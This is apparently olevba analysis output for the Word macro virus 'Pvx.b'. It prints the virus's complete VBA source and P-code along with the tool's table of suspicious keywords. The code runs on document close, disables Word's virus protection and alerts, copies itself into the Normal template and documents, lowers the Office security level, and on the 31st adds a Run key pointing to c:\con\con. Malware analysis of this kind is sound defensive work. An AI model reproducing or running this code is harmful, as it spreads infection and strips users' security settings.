olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Pvx.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Pvx.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO concon.bas 
in file: ./Virus.MSWord.Pvx.b - OLE stream: 'Macros/VBA/concon'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Dim FY, SNP
FY = (Rnd * 0)
SNP = (Rnd * 0)
Options.VirusProtection = FY
Options.SaveNormalPrompt = SNP
Application.EnableCancelKey = wCancelDisabled
Application.DisplayStatusBar = (Rnd * 0)
Application.ScreenUpdating = (Rnd * 0)
Application.DisplayAlerts = wdAlertsNone
CommandBars("Tools").Controls("Macro").Delete
Const Exportf = "c:\boot.386"
Const Ego = "concon"
Set ADoc = ActiveDocument.VBProject.VBComponents
Set NTmp = NormalTemplate.VBProject.VBComponents
ADoc(Ego).Export Exportf
NTmp(Ego).Export Exportf
For I = 1 To NTmp.Count
If NTmp(I).Name = Ego Then NtmpOK = True
Next I
For I = 1 To ADoc.Count
If ADoc(I).Name = Ego Then DocOK = True
Next I
If DocOK = True And NtmpOK = False Then Set Stoj = NormalTemplate.VBProject _
Else: If DocOK = False And NtmpOK = True Then Set Stoj = ActiveDocument.VBProject
Stoj.VBComponents.Import Exportf
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Call Pay
End Sub
Sub Pay()
Dim Xday, Strn
Xday = Date
Strn = Format(Xday, "d")
If Strn = 31 Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "") = "c:\con\con"
Dim Msg, Style, Title, Response
Msg = "Shutdown all applications and reboot"
Style = vbOK + vbCritical + vbSystemModal
Title = "Error"
Response = MsgBox(Msg, Style, Title)
End If
' (c) Pvx 2000 only for research purposes
' concon exploit virus (word97/2000 compatible) dont distribute
End Sub





-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Pvx.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/concon - 3944 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	VarDefn FY
' 	VarDefn SNP
' Line #3:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	St FY 
' Line #4:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	St SNP 
' Line #5:
' 	Ld FY 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	Ld SNP 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	Ld wCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #10:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #11:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #12:
' 	Dim (Const) 
' 	LitStr 0x000B "c:\boot.386"
' 	VarDefn Exportf
' Line #13:
' 	Dim (Const) 
' 	LitStr 0x0006 "concon"
' 	VarDefn Ego
' Line #14:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set ADoc 
' Line #15:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set NTmp 
' Line #16:
' 	Ld Exportf 
' 	Ld Ego 
' 	ArgsLd ADoc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #17:
' 	Ld Exportf 
' 	Ld Ego 
' 	ArgsLd NTmp 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #18:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NTmp 
' 	MemLd Count 
' 	For 
' Line #19:
' 	Ld I 
' 	ArgsLd NTmp 0x0001 
' 	MemLd New 
' 	Ld Ego 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NtmpOK 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ADoc 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld I 
' 	ArgsLd ADoc 0x0001 
' 	MemLd New 
' 	Ld Ego 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DocOK 
' 	EndIf 
' Line #23:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	LineCont 0x0004 0F 00 00 00
' 	Ld DocOK 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NtmpOK 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set Stoj 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	Ld DocOK 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NtmpOK 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set Stoj 
' 	EndIf 
' 	EndIf 
' Line #25:
' 	Ld Exportf 
' 	Ld Stoj 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #26:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #27:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #28:
' 	ArgsCall (Call) Pay 0x0000 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub Pay())
' Line #31:
' 	Dim 
' 	VarDefn Xday
' 	VarDefn Strn
' Line #32:
' 	Ld Date 
' 	St Xday 
' Line #33:
' 	Ld Xday 
' 	LitStr 0x0001 "d"
' 	ArgsLd Format$ 0x0002 
' 	St Strn 
' Line #34:
' 	Ld Strn 
' 	LitDI2 0x001F 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LitStr 0x000A "c:\con\con"
' 	LitStr 0x0000 ""
' 	LitStr 0x003F "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #36:
' 	Dim 
' 	VarDefn Msg
' 	VarDefn Style
' 	VarDefn Title
' 	VarDefn Response
' Line #37:
' 	LitStr 0x0024 "Shutdown all applications and reboot"
' 	St Msg 
' Line #38:
' 	Ld vbOK 
' 	Ld vbCritical 
' 	Add 
' 	Ld vbSystemModal 
' 	Add 
' 	St Style 
' Line #39:
' 	LitStr 0x0005 "Error"
' 	St Title 
' Line #40:
' 	Ld Msg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	QuoteRem 0x0000 0x0028 " (c) Pvx 2000 only for research purposes"
' Line #43:
' 	QuoteRem 0x0000 0x003E " concon exploit virus (word97/2000 compatible) dont distribute"
' Line #44:
' 	EndSub 
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

